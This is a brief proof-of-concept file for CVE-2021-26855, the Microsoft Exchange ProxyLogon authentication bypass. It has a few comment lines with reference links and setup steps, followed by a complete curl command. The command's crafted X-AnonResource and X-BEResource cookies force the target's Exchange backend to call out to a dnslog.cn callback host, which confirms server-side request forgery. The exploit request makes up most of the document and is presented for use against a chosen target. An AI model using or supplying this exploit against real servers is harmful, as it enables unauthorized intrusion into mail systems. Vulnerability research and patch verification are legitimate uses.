# CVE-2021-26855
#
# https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2021/03/16/a_look_at_the_proxyl-IlFt.html
#
# The authentication bypass vulnerability results from having to treat requests to static resources as authenticated requests on the backend, because files such as scripts and images must be available even without authentication.
#
# https://hackerone.com/reports/1119224
# https://twitter.com/zhzyker/status/1368572200194740232/photo/1
#
# 1. Change <example.com> by your target hostname
# 2. Replace <generateyour> by generating your subdomain at dnslog.cn for a DNS callback.
#
$ curl -i -s -k -X $'GET' \
    -H $'Host: <example.com>' \
    -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
    -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' \
    -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'X-AnonResource=true; X-AnonResource-Backend=<generateyours>.dnslog.cn/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \
    $'https://<example.com>/owa/auth/x.js'
